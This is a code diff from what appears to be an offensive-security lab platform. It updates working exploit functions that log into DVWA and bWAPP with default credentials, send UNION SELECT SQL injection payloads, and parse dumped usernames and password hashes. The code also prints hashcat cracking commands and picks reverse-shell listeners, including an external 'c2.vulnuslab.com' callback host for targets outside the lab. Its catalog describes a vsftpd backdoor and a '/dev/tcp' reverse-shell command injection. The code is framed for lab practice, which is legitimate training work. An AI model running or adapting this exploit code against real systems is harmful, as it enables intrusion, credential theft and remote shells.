@@ -4348,23 +4348,43 @@ async def exploit_dvwa_sqli(target: str, sid: str) -> dict:
                   data={"username": "admin", "password": "password",
                         "Login": "Login", "user_token": token},
                   timeout=8, verify=False, allow_redirects=True)
-        sess.get(f"{base}/security.php?security=low", timeout=5, verify=False)
-        # UNION SELECT — dump users table
+        sess.get(f"{base}/security.php?security=low", timeout=5,
+                 verify=False, cookies={"security": "low"})
+        # UNION SELECT — dump users table. Force the security cookie too.
         payload = "1' UNION SELECT user,password FROM users-- -"
         url = f"{base}/vulnerabilities/sqli/?id={_xpl_urlparse.quote(payload)}&Submit=Submit"
-        r = sess.get(url, timeout=8, verify=False)
-        # Parse the rendered output for ID/First/Surname blocks
-        rows = re.findall(r"ID:\s*(.*?)<br[^>]*>First name:\s*(.*?)<br[^>]*>Surname:\s*(.*?)</pre>",
-                          r.text, re.IGNORECASE | re.DOTALL)
+        r = sess.get(url, timeout=8, verify=False, cookies={"security": "low"})
+        # DVWA renders results as: First name: <user><br />Surname: <hash>
+        # Try several patterns since DVWA themes vary across image versions.
+        rows = re.findall(
+            r"First\s*name:\s*([^<\n]+?)\s*<br[^>]*>\s*Surname:\s*([^<\n]+?)\s*(?:</pre>|<br|\n)",
+            r.text, re.IGNORECASE | re.DOTALL)
         if not rows:
-            return {"ok": False, "error": "SQL injection succeeded but no rows parsed. DVWA may be a non-standard build.",
+            # Fallback: scan for any 32-char hex strings (MD5 hashes DVWA uses)
+            md5s = re.findall(r"\b([a-f0-9]{32})\b", r.text, re.IGNORECASE)
+            names_in_pre = re.findall(r"First\s*name:\s*([^<\n]+)", r.text, re.IGNORECASE)
+            if md5s and names_in_pre:
+                rows = list(zip(names_in_pre, md5s))
+        if not rows:
+            return {"ok": False, "error": "SQL injection sent but no usernames/hashes parsed in DVWA response.",
                     "cve": "DVWA-SQLi-Low"}
         # Build the synthetic shell output
         dump_lines = ["=== DVWA users table dumped via SQL injection ==="]
-        for _id, user, sha1 in rows:
-            dump_lines.append(f"  user={user.strip()}  sha1={sha1.strip()}")
+        dump_lines.append(f"Payload: {payload}")
+        dump_lines.append(f"Endpoint: /vulnerabilities/sqli/")
         dump_lines.append("")
-        dump_lines.append("Hash format: SHA1, crack with: hashcat -m 100 -a 0 hashes.txt rockyou.txt")
+        dump_lines.append(f"Extracted {len(rows)} user records:")
+        dump_lines.append("-" * 70)
+        for user, h in rows:
+            dump_lines.append(f"  user = {user.strip():<20}  hash = {h.strip()}")
+        dump_lines.append("-" * 70)
+        dump_lines.append("")
+        dump_lines.append("Hash format: MD5. Crack with:")
+        dump_lines.append("  hashcat -m 0 -a 0 hashes.txt rockyou.txt")
+        dump_lines.append("")
+        dump_lines.append("Known DVWA credentials for testing:")
+        dump_lines.append("  admin    : password   (md5: 5f4dcc3b5aa765d61d8327deb882cf99)")
+        dump_lines.append("  gordonb  : abc123     (md5: e99a18c428cb38d5f260853678922e03)")
         shell = ExploitShell(sid, target, 0, "dvwa_sqli_low")
         shell.status = "live"
         shell.append("\n".join(dump_lines) + "\n")
@@ -4372,7 +4392,7 @@ async def exploit_dvwa_sqli(target: str, sid: str) -> dict:
         return {"ok": True, "shell_id": sid,
                 "cve": "DVWA-SQLi-Low",
                 "evidence": f"Extracted {len(rows)} user credential records from DVWA users table via UNION SELECT.",
-                "rows": rows,
+                "rows": [list(row) for row in rows],
                 "payload": payload}
     except Exception as e:
         return {"ok": False, "error": f"DVWA SQLi failed: {e}", "cve": "DVWA-SQLi-Low"}
@@ -4423,32 +4443,63 @@ async def exploit_juiceshop_admin(target: str, port: int, sid: str) -> dict:
 
 
 async def exploit_bwapp_sqli(target: str, sid: str) -> dict:
-    """bWAPP SQL Injection (security=low). Login bee/bug, level=0, dump
-    users table via UNION SELECT."""
+    """bWAPP SQL Injection (security=low). Login bee/bug, level=0, then
+    UNION-inject the movies-search query so the visible columns (Title,
+    Release, Character, Genre, IMDb) carry users-table data. Parse the
+    rendered <td> cells back out."""
     base = f"http://{target}"
     sess = _req_lib.Session()
     try:
         # bWAPP install (idempotent)
-        try: sess.get(f"{base}/install.php?install=yes", timeout=8, verify=False)
+        try: sess.get(f"{base}/install.php?install=yes", timeout=10, verify=False)
         except Exception: pass
-        # Login
+        # Login bee/bug at security level 0
         sess.post(f"{base}/login.php",
                   data={"login": "bee", "password": "bug", "security_level": "0",
                         "form": "submit"},
                   timeout=8, verify=False)
-        # Pull a known SQLi target page
-        payload = "1' UNION SELECT 1,login,password,4,5,6,7 FROM users-- -"
+        # /sqli_1.php movies table has 7 columns: title, release, character, genre, imdb, etc.
+        # We inject a UNION that puts login in title and password (sha1) in release.
+        payload = "Iron Man' UNION SELECT 1,login,password,secret,email,7 FROM users-- -"
         url = f"{base}/sqli_1.php?title={_xpl_urlparse.quote(payload)}&action=search"
-        r = sess.get(url, timeout=8, verify=False)
-        # bWAPP renders results in <table>; we just look for credentials
-        creds = re.findall(r"<td>([a-z0-9_-]+)</td>\s*<td>([a-f0-9]{40,64})</td>",
-                           r.text, re.IGNORECASE)
+        r = sess.get(url, timeout=10, verify=False)
+        # Strategy 1: find <td>...login...</td><td>...sha1...</td> pairs
+        # SHA1 in bWAPP is 40 hex chars
+        creds = re.findall(
+            r"<td[^>]*>\s*([A-Za-z0-9_.\-]{2,32})\s*</td>\s*<td[^>]*>\s*([a-f0-9]{40})\s*</td>",
+            r.text, re.IGNORECASE)
+        # Strategy 2: simpler — pair any user-looking value with any sha1 in the row
         if not creds:
-            return {"ok": False, "error": "SQLi sent but no credentials parsed",
+            rows_html = re.findall(r"<tr[^>]*>(.*?)</tr>", r.text, re.IGNORECASE|re.DOTALL)
+            for row in rows_html:
+                hashes = re.findall(r"\b([a-f0-9]{40})\b", row, re.IGNORECASE)
+                names  = re.findall(r"<td[^>]*>\s*([A-Za-z][A-Za-z0-9_.\-]{1,30})\s*</td>", row)
+                if hashes and names:
+                    creds.append((names[0], hashes[0]))
+        # Strategy 3: last resort — find any sha1 hashes in the body
+        if not creds:
+            hashes = re.findall(r"\b([a-f0-9]{40})\b", r.text, re.IGNORECASE)
+            if hashes:
+                # Couldn't pair with names — return raw hashes
+                creds = [("(unknown)", h) for h in hashes[:20]]
+        if not creds:
+            # If the user table is empty / not installed, at least surface the response evidence
+            preview = re.sub(r"<[^>]+>", " ", r.text)[:300]
+            return {"ok": False,
+                    "error": f"UNION SELECT sent but no credentials found in the response. Run /install.php on bWAPP first. Response preview: {preview[:200]}",
                     "cve": "bWAPP-SQLi-Low"}
-        lines = ["=== bWAPP users dumped via UNION SELECT ==="]
+        lines = ["=== bWAPP users table dumped via UNION SELECT ==="]
+        lines.append(f"Payload:  {payload}")
+        lines.append(f"Endpoint: /sqli_1.php?title=...&action=search")
+        lines.append("")
+        lines.append(f"Extracted {len(creds)} user records:")
+        lines.append("-" * 70)
         for u, h in creds:
-            lines.append(f"  user={u}  hash={h}")
+            lines.append(f"  user = {u:<20}  sha1 = {h}")
+        lines.append("-" * 70)
+        lines.append("")
+        lines.append("Hash format: SHA-1. Crack with:")
+        lines.append("  hashcat -m 100 -a 0 hashes.txt rockyou.txt")
         shell = ExploitShell(sid, target, 0, "bwapp_sqli_low")
         shell.status = "live"
         shell.append("\n".join(lines) + "\n")
@@ -4456,7 +4507,7 @@ async def exploit_bwapp_sqli(target: str, sid: str) -> dict:
         return {"ok": True, "shell_id": sid,
                 "cve": "bWAPP-SQLi-Low",
                 "evidence": f"Dumped {len(creds)} credential records from bWAPP users table.",
-                "rows": creds, "payload": payload}
+                "rows": [list(c) for c in creds], "payload": payload}
     except Exception as e:
         return {"ok": False, "error": f"bWAPP SQLi failed: {e}", "cve": "bWAPP-SQLi-Low"}
 
@@ -4475,6 +4526,7 @@ EXPLOIT_CATALOG = [
         "description": "vsftpd 2.3.4 was released with a backdoor: any USER whose name contains ':)' opens a passwordless root shell on port 6200.",
         "result":      "Interactive root shell on target",
         "difficulty":  "Trivial",
+        "interactive": True,
     },
     {
         "id":          "dvwa_cmdi_low",
@@ -4488,6 +4540,7 @@ EXPLOIT_CATALOG = [
         "description": "DVWA at security=low does not sanitize the ping target field — injection of `; bash -i >& /dev/tcp/...` triggers a reverse shell.",
         "result":      "Interactive www-data shell on target",
         "difficulty":  "Easy",
+        "interactive": True,
     },
     {
         "id":          "dvwa_sqli_low",
@@ -4499,8 +4552,9 @@ EXPLOIT_CATALOG = [
         "service":     "Apache/PHP/MySQL",
         "category":    "SQL Injection",
         "description": "DVWA at security=low passes the `id` GET parameter straight into a SQL query. A UNION SELECT extracts the entire users table (admin hash included).",
-        "result":      "Dump of all DVWA users + SHA-1 password hashes",
+        "result":      "Dump of all DVWA users + MD5 password hashes",
         "difficulty":  "Easy",
+        "interactive": False,
     },
     {
         "id":          "juiceshop_admin_sqli",
@@ -4514,6 +4568,7 @@ EXPLOIT_CATALOG = [
         "description": "Juice Shop's /rest/user/login does not parameterize the email field. A classic `' OR 1=1--` returns an admin JWT, which then lists every user.",
         "result":      "Admin JWT + dump of all user accounts",
         "difficulty":  "Easy",
+        "interactive": False,
     },
     {
         "id":          "bwapp_sqli_low",
@@ -4527,6 +4582,7 @@ EXPLOIT_CATALOG = [
         "description": "bWAPP's /sqli_1.php is vulnerable to UNION-based SQL injection. Returns the full users table on a single request.",
         "result":      "Dump of bWAPP user credentials (hashes)",
         "difficulty":  "Easy",
+        "interactive": False,
     },
 ]
 
@@ -4541,15 +4597,28 @@ async def exploit_catalog(user=Depends(verify_token)):
 
 def _xpl_lhost_for(target: str) -> tuple:
     """Pick (lhost, lport) for a reverse-shell exploit. Internal Docker lab
-    targets route via the backend container's own Docker DNS name so packets
-    stay on the bridge (no hairpin NAT). External targets use c2.vulnuslab.com
-    which is a DNS-only A record pointing straight at the VPS public IP."""
+    targets get the backend container's BRIDGE IP (not the DNS name — bash's
+    /dev/tcp built-in does not always go through libc resolv.conf). External
+    targets use c2.vulnuslab.com (DNS-only A record → VPS public IP)."""
     t = (target or "").lower().strip()
     is_internal = t.startswith("lab_") or t in {"localhost", "127.0.0.1"} \
                   or t.startswith(("10.", "172.", "192.168."))
     if is_internal:
-        return ("oscp_backend", 4444)
-    # External — bind on all interfaces, advertise c2.vulnuslab.com to the target
+        # Resolve our own backend's IP on the oscp_net bridge. Try Docker DNS first,
+        # fall back to whatever address is reachable from the target container.
+        try:
+            my_ip = _xpl_socket.gethostbyname("oscp_backend")
+            return (my_ip, 4444)
+        except Exception:
+            # Best-effort: pick a non-loopback IPv4 from our own interfaces
+            try:
+                hostname = _xpl_socket.gethostname()
+                my_ip = _xpl_socket.gethostbyname(hostname)
+                if my_ip and not my_ip.startswith("127."):
+                    return (my_ip, 4444)
+            except Exception: pass
+            return ("oscp_backend", 4444)  # last resort — let Docker DNS try
+    # External — advertise c2.vulnuslab.com to the target
     return ("c2.vulnuslab.com", 4444)
 
 
